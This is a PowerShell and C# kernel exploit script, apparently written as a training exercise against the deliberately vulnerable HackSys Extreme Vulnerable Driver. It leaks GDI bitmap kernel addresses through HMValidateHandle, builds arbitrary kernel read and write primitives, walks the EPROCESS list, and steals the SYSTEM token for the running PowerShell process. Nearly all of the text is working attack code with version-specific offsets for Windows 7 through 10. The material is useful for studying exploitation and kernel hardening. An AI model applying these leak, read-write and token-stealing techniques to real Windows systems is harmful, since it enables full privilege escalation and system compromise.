Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

public static class EVD
{
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        String lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);
  
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        int IoControlCode,
        byte[] InBuffer,
        int nInBufferSize,
        byte[] OutBuffer,
        int nOutBufferSize,
        ref int pBytesReturned,
        IntPtr Overlapped);
}
"@

#==============================================[Helpers]
function Stage-HmValidateHandleBitmap {
<#
.SYNOPSIS
	Universal x64 Bitmap leak using HmValidateHandle.
	Targets: 7, 8, 8.1, 10, 10 RS1, 10 RS2

	Resources:
		+ Win32k Dark Composition: Attacking the Shadow part of Graphic subsystem <= 360Vulcan
		+ LPE vulnerabilities exploitation on Windows 10 Anniversary Update <= Drozdov Yurii & Drozdova Liudmila

.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None

.EXAMPLE
	PS C:\Users\b33f> Stage-HmValidateHandleBitmap |fl
	
	BitmapKernelObj : -7692235059200
	BitmappvScan0   : -7692235059120
	BitmapHandle    : 1845828432
	
	PS C:\Users\b33f> $Manager = Stage-HmValidateHandleBitmap
	PS C:\Users\b33f> "{0:X}" -f $Manager.BitmapKernelObj
	FFFFF901030FF000
#>
	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	
	public class HmValidateHandleBitmap
	{	
		delegate IntPtr WndProc(
			IntPtr hWnd,
			uint msg,
			IntPtr wParam,
			IntPtr lParam);
	
		[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
		struct WNDCLASS
		{
			public uint style;
			public IntPtr lpfnWndProc;
			public int cbClsExtra;
			public int cbWndExtra;
			public IntPtr hInstance;
			public IntPtr hIcon;
			public IntPtr hCursor;
			public IntPtr hbrBackground;
			[MarshalAs(UnmanagedType.LPWStr)]
			public string lpszMenuName;
			[MarshalAs(UnmanagedType.LPWStr)]
			public string lpszClassName;
		}
	
		[DllImport("user32.dll")]
		static extern System.UInt16 RegisterClassW(
			[In] ref WNDCLASS lpWndClass);
	
		[DllImport("user32.dll")]
		public static extern IntPtr CreateWindowExW(
			UInt32 dwExStyle,
			[MarshalAs(UnmanagedType.LPWStr)]
			string lpClassName,
			[MarshalAs(UnmanagedType.LPWStr)]
			string lpWindowName,
			UInt32 dwStyle,
			Int32 x,
			Int32 y,
			Int32 nWidth,
			Int32 nHeight,
			IntPtr hWndParent,
			IntPtr hMenu,
			IntPtr hInstance,
			IntPtr lpParam);
	
		[DllImport("user32.dll")]
		static extern System.IntPtr DefWindowProcW(
			IntPtr hWnd,
			uint msg,
			IntPtr wParam,
			IntPtr lParam);
	
		[DllImport("user32.dll")]
		public static extern bool DestroyWindow(
			IntPtr hWnd);
	
		[DllImport("user32.dll")]
		public static extern bool UnregisterClass(
			String lpClassName,
			IntPtr hInstance);
	
		[DllImport("kernel32",CharSet=CharSet.Ansi)]
		public static extern IntPtr LoadLibrary(
			string lpFileName);
	
		[DllImport("kernel32",CharSet=CharSet.Ansi,ExactSpelling=true)]
		public static extern IntPtr GetProcAddress(
			IntPtr hModule,
			string procName);
	
		public delegate IntPtr HMValidateHandle(
			IntPtr hObject,
			int Type);
	
		[DllImport("gdi32.dll")]
		public static extern IntPtr CreateBitmap(
			int nWidth,
			int nHeight,
			uint cPlanes,
			uint cBitsPerPel,
			IntPtr lpvBits);
	
		public UInt16 CustomClass(string class_name, string menu_name)
		{
			m_wnd_proc_delegate = CustomWndProc;
			WNDCLASS wind_class = new WNDCLASS();
			wind_class.lpszClassName = class_name;
			wind_class.lpszMenuName = menu_name;
			wind_class.lpfnWndProc = System.Runtime.InteropServices.Marshal.GetFunctionPointerForDelegate(m_wnd_proc_delegate);
			return RegisterClassW(ref wind_class);
		}
	
		private static IntPtr CustomWndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam)
		{
			return DefWindowProcW(hWnd, msg, wParam, lParam);
		}
	
		private WndProc m_wnd_proc_delegate;
	}
"@
	
	#------------------[Create/Destroy Window]
	# Call nonstatic public method => delegWndProc
	$AtomCreate = New-Object HmValidateHandleBitmap
	
	function Create-WindowObject {
		$MenuBuff = "A"*0x8F0
		$hAtom = $AtomCreate.CustomClass("BitmapStager",$MenuBuff)
		[HmValidateHandleBitmap]::CreateWindowExW(0,"BitmapStager",[String]::Empty,0,0,0,0,0,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero)
	}
	
	function Destroy-WindowObject {
		param ($Handle)
		$CallResult = [HmValidateHandleBitmap]::DestroyWindow($Handle)
		$CallResult = [HmValidateHandleBitmap]::UnregisterClass("BitmapStager",[IntPtr]::Zero)
	}
	
	#------------------[Cast HMValidateHandle]
	function Cast-HMValidateHandle {
		$hUser32 = [HmValidateHandleBitmap]::LoadLibrary("user32.dll")
		$lpIsMenu = [HmValidateHandleBitmap]::GetProcAddress($hUser32, "IsMenu")
		
		# Get HMValidateHandle pointer
		for ($i=0;$i-lt50;$i++) {
			if ($([System.Runtime.InteropServices.Marshal]::ReadByte($lpIsMenu.ToInt64()+$i)) -eq 0xe8) {
				$HMValidateHandleOffset = [System.Runtime.InteropServices.Marshal]::ReadInt32($lpIsMenu.ToInt64()+$i+1)
				[IntPtr]$Script:lpHMValidateHandle = $lpIsMenu.ToInt64() + $i + 5 + $HMValidateHandleOffset
			}
		}
	
		if ($lpHMValidateHandle) {
			# Cast IntPtr to delegate
			[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($lpHMValidateHandle,[HmValidateHandleBitmap+HMValidateHandle])
		}
	}
	
	#------------------[lpszMenuName Leak]
	function Leak-lpszMenuName {
		param($WindowHandle)
		$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
		$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
		if ($OSMajorMinor -eq "10.0" -And $OSVersion.Build -ge 15063) {
			$pCLSOffset = 0xa8
			$lpszMenuNameOffset = 0x90
		} else {
			$pCLSOffset = 0x98
			$lpszMenuNameOffset = 0x88
		}
	
		# Cast HMValidateHandle & get window desktop heap pointer
		$HMValidateHandle = Cast-HMValidateHandle
		$lpUserDesktopHeapWindow = $HMValidateHandle.Invoke($WindowHandle,1)
	
		# Calculate ulClientDelta & leak lpszMenuName
		$Script:ulClientDelta = [System.Runtime.InteropServices.Marshal]::ReadInt64($lpUserDesktopHeapWindow.ToInt64()+0x20) - $lpUserDesktopHeapWindow.ToInt64()
		$KerneltagCLS = [System.Runtime.InteropServices.Marshal]::ReadInt64($lpUserDesktopHeapWindow.ToInt64()+$pCLSOffset)
		[System.Runtime.InteropServices.Marshal]::ReadInt64($KerneltagCLS-$ulClientDelta+$lpszMenuNameOffset)
	}
	
	#------------------[Bitmap Leak]
	$KernelArray = @()
	for ($i=0;$i -lt 20;$i++) {
		$TestWindowHandle = Create-WindowObject
		$KernelArray += Leak-lpszMenuName -WindowHandle $TestWindowHandle
		if ($KernelArray.Length -gt 1) {
			if ($KernelArray[$i] -eq $KernelArray[$i-1]) {
				Destroy-WindowObject -Handle $TestWindowHandle
				[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x50*2*4)
				$BitmapHandle = [HmValidateHandleBitmap]::CreateBitmap(0x701, 2, 1, 8, $Buffer) # +4 kb size
				break
			}
		}
		Destroy-WindowObject -Handle $TestWindowHandle
	}
	
	$BitMapObject = @()
	$HashTable = @{
		BitmapHandle = $BitmapHandle
		BitmapKernelObj = $($KernelArray[$i])
		BitmappvScan0 = $KernelArray[$i] + 0x50
	}
	$Object = New-Object PSObject -Property $HashTable
	$BitMapObject += $Object
	$BitMapObject
}

function Get-LoadedModules {
<#
.SYNOPSIS
	Use NtQuerySystemInformation::SystemModuleInformation to get a list of
	loaded modules, their base address and size (x32/x64).

	Note: Low integrity only pre 8.1

.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None

.EXAMPLE
	C:\PS> $Modules = Get-LoadedModules
	C:\PS> $KernelBase = $Modules[0].ImageBase
	C:\PS> $KernelType = ($Modules[0].ImageName -split "\\")[-1]
	C:\PS> ......
#>

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct SYSTEM_MODULE_INFORMATION
	{
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
		public UIntPtr[] Reserved;
		public IntPtr ImageBase;
		public UInt32 ImageSize;
		public UInt32 Flags;
		public UInt16 LoadOrderIndex;
		public UInt16 InitOrderIndex;
		public UInt16 LoadCount;
		public UInt16 ModuleNameOffset;
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
		internal Char[] _ImageName;
		public String ImageName {
			get {
				return new String(_ImageName).Split(new Char[] {'\0'}, 2)[0];
			}
		}
	}

	public static class Ntdll
	{
		[DllImport("ntdll.dll")]
		public static extern int NtQuerySystemInformation(
			int SystemInformationClass,
			IntPtr SystemInformation,
			int SystemInformationLength,
			ref int ReturnLength);
	}
"@

	[int]$BuffPtr_Size = 0
	while ($true) {
		[IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtr_Size)
		$SystemInformationLength = New-Object Int
	
		# SystemModuleInformation Class = 11
		$CallResult = [Ntdll]::NtQuerySystemInformation(11, $BuffPtr, $BuffPtr_Size, [ref]$SystemInformationLength)
		
		# STATUS_INFO_LENGTH_MISMATCH
		if ($CallResult -eq 0xC0000004) {
			[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
			[int]$BuffPtr_Size = [System.Math]::Max($BuffPtr_Size,$SystemInformationLength)
		}
		# STATUS_SUCCESS
		elseif ($CallResult -eq 0x00000000) {
			break
		}
		# Probably: 0xC0000005 -> STATUS_ACCESS_VIOLATION
		else {
			[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
			return
		}
	}

	$SYSTEM_MODULE_INFORMATION = New-Object SYSTEM_MODULE_INFORMATION
	$SYSTEM_MODULE_INFORMATION = $SYSTEM_MODULE_INFORMATION.GetType()
	if ([System.IntPtr]::Size -eq 4) {
		$SYSTEM_MODULE_INFORMATION_Size = 284
	} else {
		$SYSTEM_MODULE_INFORMATION_Size = 296
	}

	$BuffOffset = $BuffPtr.ToInt64()
	$HandleCount = [System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset)
	$BuffOffset = $BuffOffset + [System.IntPtr]::Size

	$SystemModuleArray = @()
	for ($i=0; $i -lt $HandleCount; $i++){
		$SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset
		$Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SYSTEM_MODULE_INFORMATION)
		
		$HashTable = @{
			ImageName = $Cast.ImageName
			ImageBase = if ([System.IntPtr]::Size -eq 4) {$($Cast.ImageBase).ToInt32()} else {$($Cast.ImageBase).ToInt64()}
			ImageSize = "0x$('{0:X}' -f $Cast.ImageSize)"
		}
		
		$Object = New-Object PSObject -Property $HashTable
		$SystemModuleArray += $Object
	
		$BuffOffset = $BuffOffset + $SYSTEM_MODULE_INFORMATION_Size
	}

	$SystemModuleArray

	# Free SystemModuleInformation array
	[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
}

function Bitmap-Elevate {
	param([IntPtr]$ManagerBitmap,[IntPtr]$WorkerBitmap)

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	public static class BitmapElevate
	{
		[DllImport("gdi32.dll")]
		public static extern int SetBitmapBits(
			IntPtr hbmp,
			uint cBytes,
			byte[] lpBits);
		[DllImport("gdi32.dll")]
		public static extern int GetBitmapBits(
			IntPtr hbmp,
			int cbBuffer,
			IntPtr lpvBits);
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr VirtualAlloc(
			IntPtr lpAddress,
			uint dwSize,
			UInt32 flAllocationType,
			UInt32 flProtect);
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool VirtualFree(
			IntPtr lpAddress,
			uint dwSize,
			uint dwFreeType);
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool FreeLibrary(
			IntPtr hModule);
		[DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
		public static extern IntPtr LoadLibrary(
			string lpFileName);
		[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
		public static extern IntPtr GetProcAddress(
			IntPtr hModule,
			string procName);
	}
"@

	# Flag architecture $x32Architecture/!$x32Architecture
	if ([System.IntPtr]::Size -eq 4) {
		$x32Architecture = 1
	}

	# Arbitrary Kernel read
	function Bitmap-Read {
		param ($Address)
		$CallResult = [BitmapElevate]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
		[IntPtr]$Pointer = [BitmapElevate]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
		$CallResult = [BitmapElevate]::GetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, $Pointer)
		if ($x32Architecture){
			[System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
		} else {
			[System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
		}
		$CallResult = [BitmapElevate]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
	}
	
	# Arbitrary Kernel write
	function Bitmap-Write {
		param ($Address, $Value)
		$CallResult = [BitmapElevate]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
		$CallResult = [BitmapElevate]::SetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
	}
	
	$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
	$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
	switch ($OSMajorMinor)
	{
		'10.0' # Win10 / 2k16
		{
			if(!$x32Architecture){
				if($OSVersion.Build -lt 15063){
					$UniqueProcessIdOffset = 0x2e8
					$TokenOffset = 0x358          
					$ActiveProcessLinks = 0x2f0
				} else {
					$UniqueProcessIdOffset = 0x2e0
					$TokenOffset = 0x358          
					$ActiveProcessLinks = 0x2e8
				}
			} else {
				if($OSVersion.Build -lt 15063){
					$UniqueProcessIdOffset = 0xb4
					$TokenOffset = 0xf4          
					$ActiveProcessLinks = 0xb8
				} else {
					$UniqueProcessIdOffset = 0xb4
					$TokenOffset = 0xfc          
					$ActiveProcessLinks = 0xb8
				}
			}
		}
		
		'6.3' # Win8.1 / 2k12R2
		{
			if(!$x32Architecture){
				$UniqueProcessIdOffset = 0x2e0
				$TokenOffset = 0x348          
				$ActiveProcessLinks = 0x2e8
			} else {
				$UniqueProcessIdOffset = 0xb4
				$TokenOffset = 0xec          
				$ActiveProcessLinks = 0xb8
			}
		}
		
		'6.2' # Win8 / 2k12
		{
			if(!$x32Architecture){
				$UniqueProcessIdOffset = 0x2e0
				$TokenOffset = 0x348          
				$ActiveProcessLinks = 0x2e8
			} else {
				$UniqueProcessIdOffset = 0xb4
				$TokenOffset = 0xec          
				$ActiveProcessLinks = 0xb8
			}
		}
		
		'6.1' # Win7 / 2k8R2
		{
			if(!$x32Architecture){
				$UniqueProcessIdOffset = 0x180
				$TokenOffset = 0x208          
				$ActiveProcessLinks = 0x188
			} else {
				$UniqueProcessIdOffset = 0xb4
				$TokenOffset = 0xf8          
				$ActiveProcessLinks = 0xb8
			}
		}
	}
	
	# Get EPROCESS entry for System process
	echo "`n[>] Leaking SYSTEM _EPROCESS.."
	$SystemModuleArray = Get-LoadedModules
	$KernelBase = $SystemModuleArray[0].ImageBase
	$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
	$KernelHanle = [BitmapElevate]::LoadLibrary("$KernelType")
	$PsInitialSystemProcess = [BitmapElevate]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
	$SysEprocessPtr = if (!$x32Architecture) {$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase} else {$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase}
	$CallResult = [BitmapElevate]::FreeLibrary($KernelHanle)
	echo "[+] _EPROCESS list entry: 0x$("{0:X}" -f $SysEprocessPtr)"
	$SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
	echo "[+] SYSTEM _EPROCESS address: 0x$("{0:X}" -f $(Bitmap-Read -Address $SysEprocessPtr))"
	echo "[+] PID: $(Bitmap-Read -Address $($SysEPROCESS+$UniqueProcessIdOffset))"
	echo "[+] SYSTEM Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))"
	$SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)
	
	# Get EPROCESS entry for current process
	echo "`n[>] Leaking current _EPROCESS.."
	echo "[+] Traversing ActiveProcessLinks list"
	$NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
	while($true) {
		$NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
		if ($NextPID -eq $PID) {
			echo "[+] PowerShell _EPROCESS address: 0x$("{0:X}" -f $NextProcess)"
			echo "[+] PID: $NextPID"
			echo "[+] PowerShell Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
			$PoShTokenAddr = $NextProcess+$TokenOffset
			break
		}
		$NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
	}
	
	# Duplicate token!
	echo "`n[!] Duplicating SYSTEM token!`n"
	Bitmap-Write -Address $PoShTokenAddr -Value $SysToken
}

#==============================================[GDI ring0 primitive]

$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
  
if ($hDevice -eq -1) {
    echo "`n[!] Unable to get driver handle..`n"
    Return
} else {
    echo "`n[>] Driver information.."
    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
    echo "[+] Handle: $hDevice"
}

echo "`n[?] Bitmap factory!"
echo "[+] Creating & destroying Window objects.."
$ManagerBitmap = Stage-HmValidateHandleBitmap
$WorkerBitmap = Stage-HmValidateHandleBitmap
echo "[+] HMValidateHandle address: 0x$('{0:X}' -f $lpHMValidateHandle.ToInt64())"
echo "[+] ulClientDelta: 0x$('{0:X}' -f $ulClientDelta)"
echo "[+] Manager Bitmap: 0x$("{0:X}" -f $($ManagerBitmap.BitmapKernelObj))"
echo "[+] Worker Bitmap: 0x$("{0:X}" -f $($WorkerBitmap.BitmapKernelObj))"
$SystemModuleArray = Get-LoadedModules

# [IntPtr]$WriteWhatPtr->$WriteWhat + $WriteWhere
#---
[IntPtr]$WriteWhatPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.BitConverter]::GetBytes($WorkerBitmap.BitmappvScan0).Length)
[System.Runtime.InteropServices.Marshal]::Copy([System.BitConverter]::GetBytes($WorkerBitmap.BitmappvScan0), 0, $WriteWhatPtr, [System.BitConverter]::GetBytes($WorkerBitmap.BitmappvScan0).Length)
if ($x32Architecture) {
	[byte[]]$Buffer = [System.BitConverter]::GetBytes($WriteWhatPtr.ToInt32()) + [System.BitConverter]::GetBytes($ManagerBitmap.BitmappvScan0)
} else {
	[byte[]]$Buffer = [System.BitConverter]::GetBytes($WriteWhatPtr.ToInt64()) + [System.BitConverter]::GetBytes($ManagerBitmap.BitmappvScan0)
}
echo "`n[>] Sending buffer.."
echo "[+] Buffer length: $($Buffer.Length)"
echo "[+] IOCTL: 0x22200B"
[EVD]::DeviceIoControl($hDevice, 0x22200B, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null

#==============================================[Elevate]
Bitmap-Elevate -ManagerBitmap $ManagerBitmap.BitmapHandle -WorkerBitmap $WorkerBitmap.BitmapHandle